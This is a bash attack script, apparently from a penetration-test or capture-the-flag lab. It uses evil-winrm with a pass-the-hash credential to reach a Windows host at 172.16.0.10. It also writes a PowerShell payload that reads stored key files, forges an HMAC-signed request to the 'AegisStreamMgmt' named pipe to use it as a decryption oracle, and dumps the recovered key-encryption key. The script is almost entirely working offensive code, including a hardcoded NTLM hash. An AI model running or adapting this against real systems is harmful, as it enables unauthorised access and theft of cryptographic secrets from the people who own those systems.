#!/bin/bash
export PATH="$HOME/.local/share/gem/ruby/3.3.0/bin:$PATH"
export GEM_HOME="$HOME/.local/share/gem/ruby/3.3.0"
SPEC="$HOME/.local/share/gem/ruby/3.3.0/specifications/evil-winrm-3.9.gemspec"
[ -f "$SPEC" ] && sed -i '/syslog/d' "$SPEC"
pkill -f 'evil-winrm' 2>/dev/null || true
sleep 1

# upload helpers via -s script file
cat > /tmp/dc_cmds.ps1 <<'PS'
whoami
hostname
# Oracle decrypt
$viewerKey = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$wrapBlob = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
$opBytes = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')
$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$viewerKey)
$signData = New-Object byte[] ($opBytes.Length + $wrapBlob.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($wrapBlob, 0, $signData, $opBytes.Length, $wrapBlob.Length)
$sig = $hmac.ComputeHash($signData)
$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$wrapBlob.Length); $bw.Write($wrapBlob)
$bw.Write($sig); $bw.Flush()
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length); $pipe.Flush()
$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072); $pipe.Dispose()
$rOpLen = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
$kek = New-Object byte[] $rPlLen
[Array]::Copy($buf, 10 + $rOpLen + 4, $kek, 0, $rPlLen)
[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/kek.bin', $kek)
Write-Output ("ORACLE " + $rOpCode + " kek=" + [BitConverter]::ToString($kek).Replace('-','').ToLower())
PS

# Run with stdin closed so persist shell doesn't interfere
evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa -s /tmp -c 'whoami' </dev/null > /tmp/ew_run1.out 2>&1 || true
echo '==== run1 ===='
cat /tmp/ew_run1.out

# interactive-style via printf
printf 'whoami\nhostname\nexit\n' | evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa </dev/null > /tmp/ew_run2.out 2>&1 || true
# actually printf piped as stdin:
printf 'whoami\nhostname\nexit\n' | evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa > /tmp/ew_run2.out 2>&1 || true
echo '==== run2 ===='
cat /tmp/ew_run2.out
echo EW_BATCH_DONE
